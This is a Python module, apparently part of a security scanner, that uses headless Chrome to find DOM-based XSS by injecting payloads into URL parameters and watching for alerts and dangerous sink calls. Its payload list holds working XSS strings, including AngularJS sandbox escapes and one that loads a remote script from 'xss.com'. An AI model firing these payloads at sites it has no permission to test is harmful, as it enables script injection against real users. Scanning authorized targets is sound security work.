"""
Advanced DOM-based XSS Detection Engine
Detects client-side XSS vulnerabilities using browser automation and JavaScript analysis
"""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
from webdriver_manager.chrome import ChromeDriverManager
from colorama import Fore, Style
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class DOMXSSDetector:
    """Detect DOM-based XSS vulnerabilities using browser automation"""
    
    # Dangerous JavaScript sinks that can lead to XSS
    DANGEROUS_SINKS = [
        'innerHTML', 'outerHTML', 'insertAdjacentHTML',
        'document.write', 'document.writeln',
        'eval', 'setTimeout', 'setInterval', 'Function',
        'location.href', 'location.assign', 'location.replace',
        'execScript', 'setImmediate', 'msSetImmediate'
    ]
    
    # Common DOM sources that receive user input
    DOM_SOURCES = [
        'location.href', 'location.search', 'location.hash',
        'location.pathname', 'document.URL', 'document.documentURI',
        'document.referrer', 'window.name', 'document.cookie',
        'localStorage', 'sessionStorage'
    ]
    
    def __init__(self, config):
        self.config = config
        self.driver = None
        
    def setup_browser(self):
        """Setup headless Chrome with DOM XSS detection capabilities"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument(f'user-agent={self.config.user_agent}')
            
            # Enable logging for JavaScript errors
            chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
            chrome_options.set_capability('goog:loggingPrefs', {'browser': 'ALL'})
            
            # Use webdriver-manager to automatically download and manage ChromeDriver
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.set_page_load_timeout(self.config.timeout)
            
            # Inject DOM XSS detection script
            self._inject_detection_script()
            
            return True
        except Exception as e:
            if self.config.verbose:
                print(f"{Fore.YELLOW}[!] Could not setup browser for DOM XSS: {str(e)}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Install Chrome/Chromium: sudo apt install chromium-browser{Style.RESET_ALL}")
            return False
    
    def _inject_detection_script(self):
        """Inject JavaScript to monitor DOM mutations and dangerous operations"""
        detection_script = """
        window.xssDetected = false;
        window.xssDetails = [];
        
        // Monitor dangerous sinks
        const originalWrite = document.write;
        document.write = function(...args) {
            window.xssDetails.push({type: 'document.write', args: args});
            return originalWrite.apply(this, args);
        };
        
        const originalWriteln = document.writeln;
        document.writeln = function(...args) {
            window.xssDetails.push({type: 'document.writeln', args: args});
            return originalWriteln.apply(this, args);
        };
        
        // Monitor innerHTML
        const innerHTMLSetter = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set;
        Object.defineProperty(Element.prototype, 'innerHTML', {
            set: function(value) {
                window.xssDetails.push({type: 'innerHTML', value: value});
                return innerHTMLSetter.call(this, value);
            }
        });
        
        // Monitor eval
        const originalEval = window.eval;
        window.eval = function(code) {
            window.xssDetails.push({type: 'eval', code: code});
            return originalEval(code);
        };
        
        // Monitor DOM mutations
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeName === 'SCRIPT' || node.nodeName === 'IMG') {
                            window.xssDetails.push({type: 'dom_mutation', node: node.outerHTML});
                        }
                    });
                }
            });
        });
        
        observer.observe(document.documentElement, {
            childList: true,
            subtree: true
        });
        """
        return detection_script
    
    def detect_dom_xss(self, url):
        """Detect DOM-based XSS vulnerabilities"""
        if not self.driver:
            if not self.setup_browser():
                return []
        
        vulnerabilities = []
        
        # Parse URL and extract parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # No parameters to test
            return vulnerabilities
        
        if self.config.verbose:
            print(f"{Fore.CYAN}[*] Testing for DOM XSS on {url}{Style.RESET_ALL}")
        
        # First, analyze the page source for dangerous patterns
        source_vulns = self._analyze_javascript_source(url)
        
        # Test each parameter with DOM XSS payloads
        for param_name in params.keys():
            param_vulns = self._test_parameter_dom_xss(url, param_name)
            vulnerabilities.extend(param_vulns)
        
        # Add source analysis results
        vulnerabilities.extend(source_vulns)
        
        return vulnerabilities
    
    def _analyze_javascript_source(self, url):
        """Analyze JavaScript source code for dangerous patterns"""
        vulnerabilities = []
        
        try:
            self.driver.get(url)
            time.sleep(2)  # Wait for JavaScript to load
            
            # Get all script tags
            scripts = self.driver.find_elements(By.TAG_NAME, 'script')
            
            for script in scripts:
                script_content = script.get_attribute('innerHTML')
                if not script_content:
                    continue
                
                # Check for dangerous patterns
                for source in self.DOM_SOURCES:
                    if source in script_content:
                        for sink in self.DANGEROUS_SINKS:
                            if sink in script_content:
                                # Found potential DOM XSS pattern
                                if self.config.verbose:
                                    print(f"{Fore.YELLOW}[!] Potential DOM XSS: {source} -> {sink}{Style.RESET_ALL}")
                                
                                vulnerabilities.append({
                                    'type': 'dom_xss_pattern',
                                    'source': source,
                                    'sink': sink,
                                    'url': url,
                                    'severity': 'medium',
                                    'confidence': 'low',
                                    'description': f'Potentially dangerous pattern: {source} flows to {sink}'
                                })
        
        except Exception as e:
            if self.config.verbose:
                print(f"{Fore.RED}[-] Error analyzing JavaScript: {str(e)}{Style.RESET_ALL}")
        
        return vulnerabilities
    
    def _test_parameter_dom_xss(self, url, param_name):
        """Test a specific parameter for DOM XSS"""
        vulnerabilities = []
        
        # DOM XSS payloads
        dom_payloads = [
            # Basic alert payloads
            '"><img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            '\'-alert(1)-\'',
            '\";alert(1);//',
            
            # document.write exploitation
            '</script><script>alert(1)</script>',
            '</select><img src=x onerror=alert(1)>',
            '</textarea><script>alert(1)</script>',
            
            # Hash-based payloads
            '#<img src=x onerror=alert(1)>',
            '#"><img src=x onerror=alert(1)>',
            
            # AngularJS payloads
            '{{constructor.constructor(\'alert(1)\')()}}',
            '{{$on.constructor(\'alert(1)\')()}}',
            
            # jQuery payloads
            '<img src=x onerror="$.getScript(\'//xss.com\')">',
            
            # Location-based
            'javascript:alert(1)',
            'javascript:alert(document.domain)',
        ]
        
        # Set cookies if configured (only once before testing)
        if self.config.cookies:
            try:
                parsed = urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}"
                self.driver.get(base_url)
                
                for cookie_string in self.config.cookies.split(';'):
                    cookie_string = cookie_string.strip()
                    if '=' in cookie_string:
                        name, value = cookie_string.split('=', 1)
                        self.driver.add_cookie({
                            'name': name.strip(),
                            'value': value.strip(),
                            'domain': parsed.netloc
                        })
            except Exception:
                pass
        
        for payload in dom_payloads:
            try:
                # Inject payload into parameter
                test_url = self._inject_parameter(url, param_name, payload)
                
                if self.config.verbose:
                    print(f"{Fore.CYAN}    [*] Testing DOM XSS payload: {payload[:50]}...{Style.RESET_ALL}")
                
                # Load page with payload
                self.driver.get(test_url)
                time.sleep(2)  # Wait for JavaScript execution
                
                # Check for alert
                try:
                    WebDriverWait(self.driver, 3).until(EC.alert_is_present())
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    
                    if self.config.verbose:
                        print(f"{Fore.GREEN}    [+] DOM XSS FOUND! Alert triggered: {alert_text}{Style.RESET_ALL}")
                    
                    vulnerabilities.append({
                        'type': 'dom_xss',
                        'parameter': param_name,
                        'payload': payload,
                        'poc_url': test_url,
                        'verified': True,
                        'alert_text': alert_text,
                        'severity': 'high',
                        'confidence': 'high'
                    })
                    
                    break  # Found working payload
                    
                except TimeoutException:
                    # No alert, check for DOM mutations
                    xss_details = self.driver.execute_script('return window.xssDetails;')
                    if xss_details and len(xss_details) > 0:
                        if self.config.verbose:
                            print(f"{Fore.YELLOW}    [!] DOM manipulation detected: {len(xss_details)} operations{Style.RESET_ALL}")
                        
                        # Check if payload appears in DOM operations
                        for detail in xss_details:
                            detail_str = str(detail)
                            if payload in detail_str or 'alert' in detail_str.lower():
                                vulnerabilities.append({
                                    'type': 'dom_xss',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'poc_url': test_url,
                                    'verified': False,
                                    'dom_operations': xss_details,
                                    'severity': 'medium',
                                    'confidence': 'medium'
                                })
                                break
                
            except UnexpectedAlertPresentException:
                # Alert appeared during page load
                try:
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    
                    if self.config.verbose:
                        print(f"{Fore.GREEN}    [+] DOM XSS FOUND! Alert on load: {alert_text}{Style.RESET_ALL}")
                    
                    vulnerabilities.append({
                        'type': 'dom_xss',
                        'parameter': param_name,
                        'payload': payload,
                        'poc_url': test_url,
                        'verified': True,
                        'alert_text': alert_text,
                        'severity': 'high',
                        'confidence': 'high'
                    })
                    
                    break
                    
                except Exception:
                    pass
            
            except Exception as e:
                if self.config.verbose:
                    print(f"{Fore.RED}    [-] Error testing payload: {str(e)}{Style.RESET_ALL}")
        
        return vulnerabilities
    
    def _inject_parameter(self, url, param_name, value):
        """Inject value into a specific parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [value]
        
        new_query = urlencode(params, doseq=True, safe='')
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
    
    def close(self):
        """Close the browser"""
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
